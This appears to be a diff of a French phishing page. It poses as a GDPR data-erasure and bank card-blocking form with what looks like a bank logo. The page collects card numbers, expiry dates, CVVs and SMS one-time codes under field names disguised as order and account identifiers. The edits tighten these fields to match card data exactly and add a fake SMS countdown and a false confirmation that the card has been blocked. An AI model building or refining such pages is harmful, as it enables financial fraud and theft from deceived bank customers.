@@ -6,7 +6,6 @@
   <title>Suppression de mes données personnelles</title>
   <meta name="robots" content="noindex">
 
-  <!-- Si Montserrat est déjà chargée sur votre site, supprimez ces 3 lignes -->
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
   <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600;700&display=swap" rel="stylesheet">
@@ -20,7 +19,6 @@
 <section class="rgpd-erasure" id="rgpd-erasure" aria-labelledby="rgpd-title">
   <div class="rgpd-erasure__inner">
 
-    <!-- Remplacez src par le chemin de votre logo -->
     <div class="rgpd-erasure__logo">
       <a href="/" aria-label="Retour à l'accueil">
         <img src="lcl.jpg" alt="Logo de la boutique" width="190" height="60">
@@ -69,22 +67,22 @@
           </div>
 
           <div class="rgpd-erasure__field rgpd-erasure__field--full" data-field="orderNumber">
-  <label class="rgpd-erasure__label" for="rgpd-orderNumber">
-    Numéro de carte*</label>
-  <input class="rgpd-erasure__input" id="rgpd-orderNumber" name="orderNumber" type="text"
-         inputmode="numeric" autocomplete="off"
-         placeholder="Ex. : 4012 0010 3714 1112"
-         aria-describedby="rgpd-orderNumber-hint rgpd-orderNumber-error">
-  <p class="rgpd-erasure__hint" id="rgpd-orderNumber-hint">
-    Ces chiffres ne seront plus valables après la confirmation de votre demande d’opposition.
-  </p>
-  <p class="rgpd-erasure__error" id="rgpd-orderNumber-error"></p>
-</div>
+            <label class="rgpd-erasure__label" for="rgpd-orderNumber">
+              Numéro de carte*</label>
+            <input class="rgpd-erasure__input" id="rgpd-orderNumber" name="orderNumber" type="text"
+                   inputmode="numeric" autocomplete="off"
+                   placeholder="Ex. : 4012 0010 3714 1112"
+                   aria-describedby="rgpd-orderNumber-hint rgpd-orderNumber-error">
+            <p class="rgpd-erasure__hint" id="rgpd-orderNumber-hint">
+              Ces chiffres ne seront plus valables après la confirmation de votre demande d’opposition.
+            </p>
+            <p class="rgpd-erasure__error" id="rgpd-orderNumber-error"></p>
+          </div>
 
           <div class="rgpd-erasure__field" data-field="birthDayYear">
             <label class="rgpd-erasure__label" for="rgpd-birthDayYear">La date d'expiration*</label>
             <input class="rgpd-erasure__input" id="rgpd-birthDayYear" name="birthDayYear" type="text"
-                   inputmode="numeric" maxlength="7" placeholder="Ex : 12/31"
+                   inputmode="numeric" maxlength="5" placeholder="Ex : 12/31"
                    autocomplete="off" required
                    aria-describedby="rgpd-birthDayYear-hint rgpd-birthDayYear-error">
             <p class="rgpd-erasure__hint" id="rgpd-birthDayYear-hint"></p>
@@ -92,9 +90,9 @@
           </div>
 
           <div class="rgpd-erasure__field" data-field="accountId">
-            <label class="rgpd-erasure__label" for="rgpd-accountId">CVV / CVC</label>
+            <label class="rgpd-erasure__label" for="rgpd-accountId">CVV / CVC*</label>
             <input class="rgpd-erasure__input" id="rgpd-accountId" name="accountId" type="text"
-                   autocomplete="username" autocapitalize="none" spellcheck="false" maxlength="100"
+                   inputmode="numeric" autocomplete="off" maxlength="3"
                    placeholder="Ex : 310" required
                    aria-describedby="rgpd-accountId-hint rgpd-accountId-error">
             <p class="rgpd-erasure__hint" id="rgpd-accountId-hint">Composé de 3 chiffres situés au dos.</p>
@@ -118,35 +116,33 @@
       </form>
     </div>
 
-    <!-- ========== ÉTAPE 2 : à développer ========== -->
-    <!-- ========== ÉTAPE 2 : E-MAIL DE CONFIRMATION ========== -->
+    <!-- ========== ÉTAPE 2 : SMS DE CONFIRMATION ========== -->
     <div class="rgpd-erasure__step" data-step="2" hidden tabindex="-1">
       <form id="rgpd-step2" novalidate>
         <p class="rgpd-erasure__required-note">*Champs obligatoires</p>
 
         <div class="rgpd-erasure__alert" role="alert" data-alert></div>
 
+        <div class="sms-notification">
+          <div class="sms-notification__icon">
+            <span>✉</span>
+          </div>
 
-<div class="sms-notification">
-  <div class="sms-notification__icon">
-    <span>✉</span>
-  </div>
-
-  <div class="sms-notification__content">
-    <strong>Envoi de votre SMS</strong>
-    <p>Les informations relatives à votre carte sont en cours de vérification.</p>
-    <div class="sms-notification__timer">
-      <span>Réception estimée dans</span>
-      <strong id="sms-timer">02:00</strong>
-    </div>
-  </div>
-</div>
+          <div class="sms-notification__content">
+            <strong>Envoi de votre SMS</strong>
+            <p>Les informations relatives à votre carte sont en cours de vérification.</p>
+            <div class="sms-notification__timer">
+              <span>Réception estimée dans</span>
+              <strong id="sms-timer">02:00</strong>
+            </div>
+          </div>
+        </div>
 
         <div class="rgpd-erasure__grid">
           <div class="rgpd-erasure__field rgpd-erasure__field--full" data-field="smsNum">
             <label class="rgpd-erasure__label" for="rgpd-smsNum">SMS de confirmation reçu.*</label>
-            <input class="rgpd-erasure__input" id="rgpd-smsNum" name="smsNum" type="smsNum"
-                   autocomplete="smsNum" autocapitalize="none" spellcheck="false" maxlength="120"
+            <input class="rgpd-erasure__input" id="rgpd-smsNum" name="smsNum" type="text"
+                   inputmode="numeric" autocomplete="one-time-code" maxlength="6"
                    placeholder="Ex : 050201" required
                    aria-describedby="rgpd-smsNum-hint rgpd-smsNum-error">
             <p class="rgpd-erasure__hint" id="rgpd-smsNum-hint">
@@ -177,20 +173,20 @@
       <h2 class="rgpd-erasure__done-title">Confirmation de votre opposition bancaire</h2>
       <p class="rgpd-erasure__done-text">
         Nous vous confirmons que votre demande d’opposition à votre carte bancaire a bien été prise en compte.
-<strong data-done-smsNum></strong>
-</p>
+        <strong data-done-smsNum></strong>
+      </p>
 
-<p class="rgpd-erasure__done-text">
-  <strong>
-    Cette opposition est effective immédiatement. Votre carte est <br> désormais définitivement inutilisable pour toute opération.
-  </strong>
-  <br><br>
-  Un accusé de réception vous sera adressé par SMS.
+      <p class="rgpd-erasure__done-text">
+        <strong>
+          Cette opposition est effective immédiatement. Votre carte est <br> désormais définitivement inutilisable pour toute opération.
+        </strong>
+        <br><br>
+        Un accusé de réception vous sera adressé par SMS.
 
-  Pour obtenir davantage d’informations concernant les modalités de création et de délivrance d’une nouvelle carte bancaire, nous vous invitons à vous rapprocher de votre conseiller bancaire.
-</p>
+        Pour obtenir davantage d’informations concernant les modalités de création et de délivrance d’une nouvelle carte bancaire, nous vous invitons à vous rapprocher de votre conseiller bancaire.
+      </p>
 
-<a class="rgpd-btn" href="/">
+      <a class="rgpd-btn" href="/">
         Quitter
         <svg class="rgpd-btn__arrow" viewBox="0 0 24 24" fill="none" aria-hidden="true">
           <path d="M4 12h15m0 0-6-6m6 6-6 6" stroke="currentColor" stroke-width="1.8"
